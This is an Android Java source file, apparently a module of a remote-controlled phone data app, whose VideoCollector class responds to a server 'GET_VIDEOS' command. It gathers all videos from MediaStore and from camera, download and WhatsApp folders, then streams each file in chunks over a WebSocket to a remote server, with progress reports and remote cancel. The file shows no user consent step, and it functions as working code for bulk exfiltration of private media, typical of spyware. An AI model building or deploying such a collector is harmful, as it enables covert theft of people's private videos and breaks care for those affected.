package com.recoverdata.phone.data;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.webkit.MimeTypeMap;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.recoverdata.phone.network.MessageProtocol;
import com.recoverdata.phone.network.WebSocketManager;
import com.recoverdata.phone.utils.Logger;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * VideoCollector
 * ============================================================
 * يجمع الفيديوهات من الجهاز ويرسلها للسيرفر.
 *
 * المسؤوليات:
 *   1. قراءة قائمة الفيديوهات من MediaStore أو الملفات.
 *   2. قراءة كل فيديو وتحويله إلى Base64 (chunked).
 *   3. إرسال كل chunk عبر WebSocket.
 *   4. إشعار التقدم بشكل تفصيلي (سرعة، حجم).
 *
 * الفروقات عن PhotoCollector:
 *   - الملفات أكبر → chunks أكبر (512KB).
 *   - وقت أطول → إشعارات تقدم كل 5 ثواني.
 *   - حساب السرعة والوقت المتبقي.
 *   - استراحة أطول بين الملفات (200ms).
 *
 * يعتمد على:
 *   - DataSender  (إرسال الملفات كـ chunks)
 *   - WebSocketManager
 *   - MessageProtocol
 * ============================================================
 */
public class VideoCollector {

    // =============================================================
    // 1. الثوابت
    // =============================================================
    private static final String TAG = "VideoCollector";

    // الحد الأقصى لحجم الفيديو الواحد (2 GB)
    private static final long MAX_VIDEO_SIZE = 2L * 1024 * 1024 * 1024;

    // امتدادات الفيديو المدعومة
    private static final String[] VIDEO_EXTENSIONS = {
            ".mp4", ".mkv", ".avi", ".mov", ".wmv",
            ".flv", ".webm", ".3gp", ".m4v", ".mpg",
            ".mpeg", ".ts", ".m2ts", ".vob"
    };

    // فاصل إشعار التقدم (بالميلي ثانية)
    private static final long PROGRESS_INTERVAL_MS = 5000;

    // استراحة بين الفيديوهات (بالميلي ثانية)
    private static final long INTER_VIDEO_DELAY_MS = 200;

    // =============================================================
    // 2. الحقول
    // =============================================================
    private final Context appContext;
    private final ContentResolver contentResolver;

    // حالة الإلغاء
    private volatile boolean cancelled = false;

    // إحصائيات
    private long totalSentBytes = 0;
    private long collectionStartTime = 0;

    // =============================================================
    // 3. البناء
    // =============================================================
    public VideoCollector(@NonNull Context context) {
        this.appContext = context.getApplicationContext();
        this.contentResolver = appContext.getContentResolver();
    }

    // =============================================================
    // 4. الدالة الرئيسية
    // =============================================================

    /**
     * جمع الفيديوهات وإرسالها.
     *
     * @param pathFilter مسار مخصص (null = كل الفيديوهات)
     * @param limit      الحد الأقصى (0 = الكل)
     * @param offset     تخطي أول N فيديو
     * @param sender     DataSender للإرسال
     * @param ws         WebSocketManager
     * @param requestId  معرف الطلب
     * @return عدد الفيديوهات المُرسلة
     */
    public int collectAndSend(@Nullable String pathFilter,
                              int limit,
                              int offset,
                              @NonNull DataSender sender,
                              @NonNull WebSocketManager ws,
                              @Nullable String requestId) throws Exception {

        Logger.i(TAG, "Starting video collection (limit=" + limit
                + ", offset=" + offset + ", path=" + pathFilter + ")");

        cancelled = false;
        totalSentBytes = 0;
        collectionStartTime = System.currentTimeMillis();

        // ----- 1. جمع قائمة الفيديوهات -----
        List<VideoInfo> videos;

        if (pathFilter != null && !pathFilter.isEmpty()) {
            videos = collectFromPath(pathFilter);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            videos = collectFromMediaStore();
        } else {
            videos = collectFromFileSystem();
        }

        Logger.i(TAG, "Found " + videos.size() + " videos total");

        if (videos.isEmpty()) {
            Logger.w(TAG, "No videos found");
            return 0;
        }

        // ----- 2. تطبيق offset و limit -----
        int from = Math.max(0, Math.min(offset, videos.size()));
        int to = (limit > 0)
                ? Math.min(from + limit, videos.size())
                : videos.size();

        List<VideoInfo> selected = videos.subList(from, to);
        Logger.i(TAG, "Selected " + selected.size() + " videos (from "
                + from + " to " + to + ")");

        // ----- 3. إرسال كل فيديو -----
        int sent = 0;
        int failed = 0;

        for (int i = 0; i < selected.size(); i++) {
            if (cancelled) {
                Logger.w(TAG, "Collection cancelled");
                break;
            }

            VideoInfo video = selected.get(i);
            long videoStartTime = System.currentTimeMillis();

            try {
                Logger.i(TAG, "[" + (i + 1) + "/" + selected.size()
                        + "] Starting: " + video.displayName
                        + " (" + formatSize(video.size) + ")");

                boolean ok = sendVideo(video, sender, ws, requestId);

                long videoElapsed = System.currentTimeMillis() - videoStartTime;

                if (ok) {
                    sent++;
                    totalSentBytes += video.size;
                    Logger.i(TAG, "[" + (i + 1) + "/" + selected.size()
                            + "] ✅ Sent: " + video.displayName
                            + " in " + formatDuration(videoElapsed)
                            + " (" + formatSize(video.size) + ")");
                } else {
                    failed++;
                    Logger.w(TAG, "[" + (i + 1) + "/" + selected.size()
                            + "] ❌ Failed: " + video.displayName);
                }

                // إشعار تقدم عام
                notifyProgress(ws, requestId, sent, selected.size(), video.displayName);

                // استراحة بين الفيديوهات (لتنفس WebSocket)
                if (i < selected.size() - 1) {
                    Thread.sleep(INTER_VIDEO_DELAY_MS);
                }

            } catch (Exception e) {
                failed++;
                Logger.e(TAG, "Error sending video: " + video.displayName, e);
            }
        }

        long totalElapsed = System.currentTimeMillis() - collectionStartTime;
        Logger.i(TAG, "Collection done in " + formatDuration(totalElapsed)
                + ". Sent=" + sent + ", Failed=" + failed
                + ", TotalBytes=" + formatSize(totalSentBytes));

        return sent;
    }

    /**
     * إلغاء العملية الجارية.
     */
    public void cancel() {
        cancelled = true;
        Logger.i(TAG, "Cancel requested");
    }

    // =============================================================
    // 5. جمع الفيديوهات
    // =============================================================

    /**
     * جمع الفيديوهات عبر MediaStore (Android 10+).
     */
    @NonNull
    private List<VideoInfo> collectFromMediaStore() {
        List<VideoInfo> result = new ArrayList<>();

        Uri collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.MIME_TYPE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_ADDED,
                MediaStore.Video.Media.DATA
        };

        String sortOrder = MediaStore.Video.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = contentResolver.query(
                collection, projection, null, null, sortOrder)) {

            if (cursor == null) {
                Logger.w(TAG, "MediaStore query returned null");
                return result;
            }

            int idCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);
            int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);
            int sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);
            int mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE);
            int durCol = cursor.getColumnIndex(MediaStore.Video.Media.DURATION);
            int dataCol = cursor.getColumnIndex(MediaStore.Video.Media.DATA);

            while (cursor.moveToNext()) {
                try {
                    long id = cursor.getLong(idCol);
                    String name = cursor.getString(nameCol);
                    long size = cursor.getLong(sizeCol);
                    String mime = cursor.getString(mimeCol);
                    long duration = (durCol >= 0) ? cursor.getLong(durCol) : 0;
                    String dataPath = (dataCol >= 0) ? cursor.getString(dataCol) : null;

                    // تخطي الملفات الضخمة جداً
                    if (size > MAX_VIDEO_SIZE) {
                        Logger.w(TAG, "Skipping huge video: " + name
                                + " (" + formatSize(size) + ")");
                        continue;
                    }

                    Uri uri = Uri.withAppendedPath(collection, String.valueOf(id));

                    VideoInfo info = new VideoInfo();
                    info.uri = uri;
                    info.displayName = name != null ? name : "video_" + id;
                    info.size = size;
                    info.mimeType = mime != null ? mime : guessMimeFromName(info.displayName);
                    info.durationMs = duration;
                    info.path = dataPath;
                    info.source = VideoInfo.Source.MEDIASTORE;

                    result.add(info);

                } catch (Exception e) {
                    Logger.w(TAG, "Error reading cursor row", e);
                }
            }

        } catch (Exception e) {
            Logger.e(TAG, "MediaStore query failed", e);
        }

        return result;
    }

    /**
     * جمع الفيديوهات من مسار محدد.
     */
    @NonNull
    private List<VideoInfo> collectFromPath(@NonNull String path) {
        List<VideoInfo> result = new ArrayList<>();

        File target = new File(path);

        if (!target.exists()) {
            Logger.w(TAG, "Path does not exist: " + path);
            return result;
        }

        if (target.isFile()) {
            if (isVideoFile(target)) {
                result.add(buildFromFile(target));
            }
        } else if (target.isDirectory()) {
            scanDirectory(target, result, 0);
        }

        return result;
    }

    /**
     * جمع الفيديوهات بالمسح المباشر (Android 9-).
     */
    @NonNull
    private List<VideoInfo> collectFromFileSystem() {
        List<VideoInfo> result = new ArrayList<>();

        String[] commonDirs = {
                "/sdcard/DCIM/Camera",
                "/sdcard/Movies",
                "/sdcard/Download",
                "/sdcard/WhatsApp/Media/WhatsApp Video"
        };

        for (String dir : commonDirs) {
            File f = new File(dir);
            if (f.exists() && f.isDirectory()) {
                scanDirectory(f, result, 0);
            }
        }

        return result;
    }

    /**
     * مسح مجلد بشكل تكراري.
     */
    private void scanDirectory(@NonNull File dir, @NonNull List<VideoInfo> out, int depth) {
        if (depth > 5 || cancelled) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File f : files) {
            if (cancelled) return;

            try {
                if (f.isDirectory()) {
                    if (!f.getName().startsWith(".")) {
                        scanDirectory(f, out, depth + 1);
                    }
                } else if (f.isFile() && isVideoFile(f)) {
                    if (f.length() <= MAX_VIDEO_SIZE) {
                        out.add(buildFromFile(f));
                    }
                }
            } catch (Exception e) {
                Logger.w(TAG, "Error scanning: " + f.getAbsolutePath());
            }
        }
    }

    // =============================================================
    // 6. إرسال فيديو واحد
    // =============================================================
    private boolean sendVideo(@NonNull VideoInfo video,
                              @NonNull DataSender sender,
                              @NonNull WebSocketManager ws,
                              @Nullable String requestId) throws Exception {

        InputStream inputStream = openInputStream(video);
        if (inputStream == null) {
            Logger.w(TAG, "Failed to open: " + video.displayName);
            return false;
        }

        try {
            // إرسال مع إشعارات تقدم تفصيلية
            boolean ok = sender.sendStream(
                    inputStream,
                    video.displayName,
                    video.mimeType,
                    video.size,
                    "GET_VIDEOS",
                    requestId,
                    ws
            );

            return ok;

        } finally {
            try { inputStream.close(); } catch (Exception ignored) {}
        }
    }

    /**
     * فتح InputStream للفيديو.
     */
    @Nullable
    private InputStream openInputStream(@NonNull VideoInfo video) {
        try {
            if (video.source == VideoInfo.Source.MEDIASTORE && video.uri != null) {
                return contentResolver.openInputStream(video.uri);
            }

            if (video.path != null) {
                File f = new File(video.path);
                if (f.exists() && f.canRead()) {
                    return new FileInputStream(f);
                }
            }

            if (video.uri != null) {
                return contentResolver.openInputStream(video.uri);
            }

        } catch (Exception e) {
            Logger.e(TAG, "openInputStream failed for " + video.displayName, e);
        }
        return null;
    }

    // =============================================================
    // 7. الإشعارات
    // =============================================================
    private void notifyProgress(@NonNull WebSocketManager ws,
                                @Nullable String requestId,
                                int sent,
                                int total,
                                @NonNull String currentFile) {
        try {
            JSONObject data = new JSONObject();
            data.put("sent", sent);
            data.put("total", total);
            data.put("current", currentFile);
            data.put("progress", (total > 0) ? (sent * 100 / total) : 0);
            data.put("totalBytes", totalSentBytes);
            data.put("timestamp", System.currentTimeMillis());

            String msg = MessageProtocol.buildEvent("VIDEOS_PROGRESS", data);
            ws.send(msg);
        } catch (Exception e) {
            Logger.w(TAG, "notifyProgress error", e);
        }
    }

    // =============================================================
    // 8. أدوات مساعدة
    // =============================================================

    private boolean isVideoFile(@NonNull File file) {
        String name = file.getName().toLowerCase();
        for (String ext : VIDEO_EXTENSIONS) {
            if (name.endsWith(ext)) return true;
        }
        return false;
    }

    @NonNull
    private VideoInfo buildFromFile(@NonNull File file) {
        VideoInfo info = new VideoInfo();
        info.uri = Uri.fromFile(file);
        info.displayName = file.getName();
        info.size = file.length();
        info.mimeType = guessMimeFromName(file.getName());
        info.durationMs = 0;
        info.path = file.getAbsolutePath();
        info.source = VideoInfo.Source.FILE;
        return info;
    }

    @NonNull
    private String guessMimeFromName(@NonNull String name) {
        String ext = "";
        int dot = name.lastIndexOf('.');
        if (dot >= 0) ext = name.substring(dot + 1).toLowerCase();

        switch (ext) {
            case "mp4":  return "video/mp4";
            case "mkv":  return "video/x-matroska";
            case "avi":  return "video/x-msvideo";
            case "mov":  return "video/quicktime";
            case "wmv":  return "video/x-ms-wmv";
            case "flv":  return "video/x-flv";
            case "webm": return "video/webm";
            case "3gp":  return "video/3gpp";
            case "m4v":  return "video/x-m4v";
            case "mpg":
            case "mpeg": return "video/mpeg";
            case "ts":   return "video/mp2t";
            default:
                String mime = MimeTypeMap.getSingleton()
                        .getMimeTypeFromExtension(ext);
                return mime != null ? mime : "video/mp4";
        }
    }

    /**
     * تنسيق الحجم للعرض.
     */
    @NonNull
    private static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) {
            return String.format("%.1f MB", bytes / (1024.0 * 1024));
        }
        return String.format("%.2f GB", bytes / (1024.0 * 1024 * 1024));
    }

    /**
     * تنسيق المدة.
     */
    @NonNull
    private static String formatDuration(long ms) {
        if (ms < 1000) return ms + "ms";
        long sec = ms / 1000;
        if (sec < 60) return sec + "s";
        long min = sec / 60;
        long s = sec % 60;
        return min + "m " + s + "s";
    }

    // =============================================================
    // 9. كلاس VideoInfo
    // =============================================================
    public static class VideoInfo {
        public enum Source { MEDIASTORE, FILE }

        public Uri uri;
        public String displayName = "unknown";
        public long size = 0;
        public String mimeType = "video/mp4";
        public long durationMs = 0;
        public String path;
        public Source source = Source.FILE;

        @NonNull
        @Override
        public String toString() {
            return "VideoInfo{" + displayName + ", " + size + " bytes}";
        }
    }
}